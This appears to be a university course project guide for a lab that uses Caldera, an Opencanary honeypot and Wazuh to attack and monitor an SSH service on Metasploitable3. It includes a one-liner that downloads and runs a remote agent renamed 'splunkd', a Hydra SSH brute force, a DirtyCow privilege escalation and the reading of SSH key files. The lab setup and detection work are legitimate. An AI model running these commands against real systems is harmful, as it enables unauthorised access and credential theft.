# ICS344

---

# Installation, Configuration, and Attack Execution Steps

This document provides a detailed guide to installing the necessary tools, configuring the environments, and performing the attacks in the project.

---

## 1. Prerequisites

### Tools and Software Required:
- **Kali Linux**: The primary platform for conducting attacks.
- **Metasploitable3**: The target vulnerable machine simulating a real SSH service.
- **Opencanary**: A lightweight honeypot for simulating SSH activity.
- **Wazuh**: A SIEM tool for monitoring and analyzing attack patterns.
- **Docker**: To deploy Wazuh easily.

Ensure the following packages are installed:
- `curl`
- `git`
- `python3` (Version < 3.12)
- `pip`
- `ssh`
- `nmap`
- `hydra`

---

## 2. Installing the Necessary Tools

### 2.1 Install Caldera
1. Install **Node.js** and **Go**:
   ```bash
   curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
   sudo apt install -y nodejs
   sudo rm -rf /usr/lib/go && sudo tar -C /usr/lib -xzf /path/to/go1.23.2.linux-amd64.tar.gz
   echo "export PATH=$PATH:/usr/lib/go/bin" >> ~/.bashrc
   source ~/.bashrc
   ```

2. Clone the Caldera repository and set up the environment:
   ```bash
   git clone https://github.com/mitre/caldera.git --recursive
   cd caldera
   python3 -m venv venv
   source venv/bin/activate
   pip install -r requirements.txt
   python3 server.py --build
   ```

### 2.2 Deploy Sandcat Agent
1. Create a batch file for deploying the agent:
   ```bash
   server="http://<Kali_IP>:8888";
   curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "gocat-extensions:" \
       $server/file/download > splunkd; chmod +x splunkd; ./splunkd -server $server -group red -v
   ```

### 2.3 Install Opencanary Honeypot
1. Set up a virtual environment and install Opencanary:
   ```bash
   python3 -m venv opencanary
   source opencanary/bin/activate
   pip install opencanary
   ```

2. Configure Opencanary to simulate an SSH service:
   ```json
   {
       "device.node_id": "opencanary-1",
       "logging": {
           "file": {
               "enabled": true,
               "format": "%(asctime)s - %(message)s",
               "path": "opencanary.log"
           }
       },
       "ssh": {
           "enabled": true,
           "port": 2222
       }
   }
   ```
   Run the honeypot:
   ```bash
   opencanaryd --start
   ```

### 2.4 Install Wazuh
1. Deploy Wazuh using Docker:
   ```bash
   docker-compose up -d
   ```
2. Access the Wazuh dashboard at `http://<Wazuh_IP>:5601` and configure agents to collect logs from the SSH service and honeypot.

---

## 3. Configuring and Performing Attacks

### 3.1 Configure Caldera Adversary Profile
Create a profile for the SSH attack:
```yaml
id: 93b4564b-3ce7-465f-8a64-71c02b2cc7ce
name: SSH Compromiser 1
description: ---
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
atomic_ordering:
  - c44e5e7c-7a1e-4741-9e20-00b927c7bf3e
  - 550bf3d1-4849-4372-91af-1801113a8347
  - 9590a894-8c72-49ed-abb7-0bd1e8d49d17
  - 01628dc5-be13-465d-8e91-3a02e0e42606
abilities:
  c44e5e7c-7a1e-4741-9e20-00b927c7bf3e:
    name: Brute Force SSH and Login 1
    tactic: credential-access
    technique_name: "Account Discovery"
    technique_id: T1110.001
    executors:
      - sh:
          platform: linux
          command: |
            IP="192.168.56.105";
            PORT="22";
            USERLIST="/home/kali/Downloads/user.txt";
            PASSLIST="/home/kali/Downloads/pass.txt";
            RESULTFILE="/home/kali/Downloads/ssh_crack.txt";

            hydra -L "$USERLIST" -P "$PASSLIST" ssh://$IP -t 4 -o "$RESULTFILE";

  550bf3d1-4849-4372-91af-1801113a8347:
    name: Using DirtyCow to gain privilege (Require dirtycow) 1
    tactic: privilege-escalation
    technique_name: "Exploitation for Privilege Escalation"
    technique_id: T1068
    executors:
      - sh:
          platform: linux
          command: |
            ./dirtycow exploit
```

### 3.2 Perform Attacks
1. **Brute Force SSH Attack**:
   Execute Hydra:
   ```bash
   hydra -L /path/to/user.txt -P /path/to/pass.txt ssh://<Target_IP> -t 4 -o results.txt
   ```
2. **Privilege Escalation**:
   Use the DirtyCow exploit:
   ```bash
   ./dirtycow
   ```
3. **File and Directory Discovery**:
   ```bash
   cd $HOME && find . -print > /tmp/T1083.txt
   ```
4. **Extract SSH Keys**:
   ```bash
   cat ~/.ssh/authorized_keys
   ```

---

## 4. Monitoring and Analysis with Wazuh

1. **Forward Logs to Wazuh**:
   Configure agents to monitor logs from:
   - The real SSH service (Metasploitable3)
   - The honeypot (Opencanary)

2. **Analyze Data**:
   - Use the Wazuh dashboard to view "Alerts Evolution Over Time."
   - Evaluate detected tactics using MITRE ATT&CK mappings.

3. **Identify Anomalies**:
   - Compare patterns between the real service and honeypot.
   - Assess effectiveness of the honeypot in mimicking the real service.

---

## 5. Summary

This guide covered the installation, configuration, and execution of attacks using Caldera, Opencanary, and Wazuh. The methods provide insights into the effectiveness of automated and manual attacks while highlighting the differences between a real service and a honeypot.
